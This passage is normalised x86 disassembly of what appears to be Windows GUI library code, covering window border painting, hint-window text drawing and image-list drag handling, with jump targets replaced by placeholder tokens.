je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_448f18
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_448b3c
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_442dcc
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_448f54
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_443c54
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_4416cc
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_448f9c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443e74
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_448fcc
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_448788
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_444dec
xor ecx ecx
push ebp
push sub_4490fb
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_445284
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_445284
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449102
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_444df4
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_445248
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_449102
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_4038bc
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_4038bc
jmp r-xdata
sub_449198
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_442f30
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_442f30
sub_4491dc
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_442f30
sub_44924c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_4492dc
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_449542
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_421d14
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_44955c
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_407494
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_4418a8
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_445e0c
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_442f30
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_4440f8
sub_4495c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_440e64
mov dl 0x1
mov eax [ r-xdata ]
call sub_421e30
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_440940
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_449624
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_4036c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_440f3c
test bl bl
jle r-xdata
xor eax eax
call sub_43ef48
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_449664
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_422134
xor eax eax
push ebp
push sub_4496ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_422568
xor eax eax
push ebp
push sub_4496dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4496e3
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_422568
retn
sub_449710
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_449fd8
mov edx 0x80ffff
mov eax esi
call sub_441f04
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_422408
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_421dfc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_44977c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4453e0
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_445378
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_4497c0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_449816
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44981d
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call ReleaseDC
retn
sub_449824
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4498bd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_421514
mov eax ebx
call sub_4440a0
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_441d64
mov eax [ ebp - 0x14 ]
call sub_4048dc
push eax
mov eax [ ebx + 0x208 ]
call sub_4224e8
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4498c4
lea eax [ ebp - 0x14 ]
call sub_40442c
retn
sub_4498cc
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_449938
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_4499c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4499ca
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404450
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_441d64
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_422348
mov edx eax
add edx 0x6
mov eax esi
call sub_441520
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_441d64
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_422364
mov edx eax
add edx 0x4
mov eax esi
call sub_441544
sub_4499d0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_449b97
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_441d94
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_442fd4
mov eax [ esi ]
call sub_45fa60
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_45fa6c
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_45fa60
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_45fa54
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_45fa6c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_45fa48
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_45fa54
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_45fa48
mov [ ebp - 0xc ] eax
push 0x4
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449b9e
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_4046e4
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_44cc24
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call [ rw-data ]
sub_449ba8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xcc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_449bd0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_414b64
mov eax esi
call sub_4440a0
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_4048dc
push eax
mov eax [ esi + 0x208 ]
call sub_4224e8
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_449c2c
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_414b64
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
add esp 0x10
pop esi
pop ebx
retn
sub_449c60
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_446560
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
pop esi
pop ebx
retn
sub_449c84
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_449cdc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_449d9c
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45ff34
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_428f48
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45ff34
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_428f48
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_449da8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44ed6c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_44ef40
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_449e08
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44fba0
mov eax ebx
call sub_44ed6c
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x6a ] 0x0
je r-xdata
push esi
push 0x0
call ImageList_GetDragImage
sub_449e34
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_44ed6c
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_449cdc
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_449e94
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_449da8
push 0x0
call ShowCursor
sub_449e94
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_44ed6c
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_449ef8
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_449c84
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_449ef8
push ebx
mov ebx eax
mov eax ebx
call sub_44ed6c
test al al
